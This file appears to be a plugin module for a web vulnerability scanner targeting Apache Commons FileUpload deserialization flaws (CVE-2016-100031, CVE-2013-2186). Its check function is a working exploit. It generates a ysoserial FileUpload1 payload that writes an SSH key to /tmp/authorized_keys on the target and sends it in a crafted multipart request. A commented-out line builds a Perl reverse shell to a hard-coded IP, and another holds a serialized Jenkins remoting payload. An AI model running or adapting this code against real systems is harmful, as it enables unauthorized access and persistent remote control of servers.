
module.exports={
	tags:"web,acf,CVE-2016-100031,fileupload,CVE-2013-2186",
	"ID":"020102",
	des:"CVE-2016-100031,CVE-2013-2186,Apache Commons FileUpload Vulnerability detection",
	dependencies:"java,",
	VulApps:["https://www.secfree.com/article-1079.html",
		"http://mirrors.jenkins.io/war/2.46/jenkins.war",
		"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/FileUpload1.java"],
	urls:["https://issues.apache.org/jira/secure/attachment/12838910/fix2.patch",
		"https://www.tenable.com/security/research/tra-2016-12"],
	doCheck:function (url,fnCbk)
	{
		/**
# https://jenkins.io/security/advisory/2017-04-26/
# https://blogs.securiteam.com/index.php/archives/3171
# http://www.securityfocus.com/bid/98056/info
# http://mirrors.jenkins.io/war/
# https://github.com/jenkinsci/jenkins/commit/36b8285a41eb28333549e8d851f81fd80a184076
# https://github.com/jenkinsci/jenkins/blob/36b8285a41eb28333549e8d851f81fd80a184076/core/src/main/java/jenkins/model/Jenkins.java#L817
# https://github.com/phith0n/vulhub/blob/master/jenkins/CVE-2017-1000353/
# https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/jenkins_CVE_2017_1000353.py
# http://paper.seebug.org/295/
# http://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html
# https://github.com/fonkap/java_deser/blob/master/java_deser/des.py
 * - copyAndDelete;sourceFile;destDir
 * - write;destDir;ascii-data
 * - writeB64;destDir;base64-data
 * - writeOld;destFile;ascii-data
 * - writeOldB64;destFile;base64-data
		 */
		var szTestIp = "192.168.28.123";
		// msfvenom -p cmd/unix/reverse_perl lport=4444 LHOST=
		var _t = this,_s = _t.self,szPF = "/tmp/" + new Date().getTime(),//.ssh/authorized_keys
			szPayload1 = `java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar FileUpload1 'write;/tmp/authorized_keys;${_s.config.xKeys}'`;
			// szPayload1 = `java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"${szTestIp}:8888\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"`;
			_s.child_process.execSync( szPayload1 + ">" + szPF),
			sP = _s.fs.readFileSync(szPF);//.toString("binary");
			var s = 'x\x00\x00\x00\x00', uO = _s.parseUrl(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
			
			var szTmp = '',tNum = 'e5a4a9'/*new Date().getTime()*/,
				boundary = '---------------------------e5a48f' + tNum,
				szTmp2 = '--' + boundary + '\r\nContent-Disposition: form-data; name="x"; filename="'
				 + s + '\0b"\r\nContent-Type: text/plain\r\n\r\n' + _s.fs.readFileSync(szPF) + '\r\n--' + boundary + '--\r\n\r\n';
			_s.fnSocket(host,port,szTmp = 'POST ' + uO.path + ' HTTP/1.1\r\nHost: ' 
				+ uO.host + '\r\nContent-Length: ' + (szTmp2.length + 4) + '\r\nUser-Agent: ' 
				+ _s.g_szUa + '\r\nContent-Type: multipart/form-data; boundary=' + boundary 
			+ '\r\nConnection: close\r\n\r\n' + szTmp2,
				function(data)
			{
				_s.log(data)
				var d = (data && data.toString().trim() || "").toString("utf8");
				_s.fnShowBody(d);
	    		_s.fnDoBody(d,"s2-046",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":szTmp};
	  				// console.log(szTmp);
	  				if(fnCbk)fnCbk(_s.copyO2O(r,o),_t);
	  			});
			});

		// _s.request(_s.fnOptHeader({method: 'POST',uri: url.replace(/\?.*?$/gmi,'')
		// 	// ,body: '<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
		// 	// + '\x00\x00\x00\x00'
		// 	// + _s.fs.createReadStream(szPF)
		// 	,'formData':formData
		// 	,headers:
		//     {
		// 		"User-Agent": _s.g_szUa,
		// 		'Session': 'xxxxxxxxx',
		// 		'Side' : 'download'
		// 		,"Content-Type":"multipart/form-data"
		//     }})
		//   ,function (error, response, body)
		//   {
		// 	_s.child_process.execSync("rm -rf " + szPF);
		//     console.log(error||body);
		//   	_s.error(error);
		//   	body = String(body);
		//   	_s.fnShowBody(body);
	  	// 	if(body)
	  	// 	{
	  	// 		body = _s.fnCheckVul1(String(body));

	  			
	  	// 		_s.fnDoBody(body,"CVE-2016-100031",url,null,function(o)
	  	// 		{
	  	// 			var r = {"url":url,"send":szPayload1};
	  	// 			fnCbk(_s.copyO2O(r,o),_t);
	  	// 		});
	  	// 	}
		//   }
		// );
	}
};